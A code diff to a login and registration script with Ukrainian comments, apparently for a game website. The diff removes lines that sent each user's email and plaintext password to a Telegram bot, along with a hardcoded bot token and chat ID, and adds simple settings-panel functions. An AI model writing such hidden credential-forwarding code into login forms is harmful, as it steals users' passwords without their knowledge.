@@ -6,10 +6,6 @@ let pendingButton = null;
 // ПЕРЕВІР: Тут має бути твоє посилання БЕЗ "/" в кінці
 const API_URL = 'https://st-backend-production.up.railway.app';
 
-// Твій Telegram
-const TELEGRAM_TOKEN = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg';
-const TELEGRAM_CHAT_ID = '8399462172';
-
 function handleTabClick(btnElement, tabId) {
     if (!isUserRegistered) {
         pendingTabId = tabId;
@@ -56,7 +52,7 @@ function switchAuth(mode) {
     }
 }
 
-// ОСНОВНА ФУНКЦІЯ (ВИПРАВЛЕНА)
+// ОСНОВНА ФУНКЦІЯ
 document.getElementById('auth-form').addEventListener('submit', async (e) => {
     e.preventDefault();
     
@@ -85,10 +81,6 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
         if (res.ok) {
             const data = await res.json();
             
-            // Відправка в Telegram
-            const tgMsg = `🚀 Дія: ${currentMode.toUpperCase()}\n👤 Nick: ${nickname || data.user?.username || 'N/A'}\n📧 Email: ${email}\n🔑 Pass: ${password}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`);
-
             isUserRegistered = true;
             document.getElementById('player-display').innerHTML = `Player: <strong>${nickname || data.user?.username || "User"}</strong>`;
             document.getElementById('settings-btn').style.display = 'inline-block';
@@ -111,6 +103,23 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
         submitBtn.textContent = currentMode === 'reg' ? 'Register & Enter' : 'Login & Enter';
     }
 });
+
+// Функції налаштувань
+function openSettings() {
+    document.getElementById('right-sidebar').classList.add('open');
+}
+
+function closeSettings() {
+    document.getElementById('right-sidebar').classList.remove('open');
+}
+
+function saveSettings() {
+    const newNickname = document.getElementById('change-nickname').value;
+    if (newNickname.trim() !== "") {
+        document.getElementById('player-display').innerHTML = `Player: <strong>${newNickname}</strong>`;
+    }
+    closeSettings();
+}
 
 window.onclick = function(event) {
     const modal = document.getElementById('auth-modal');
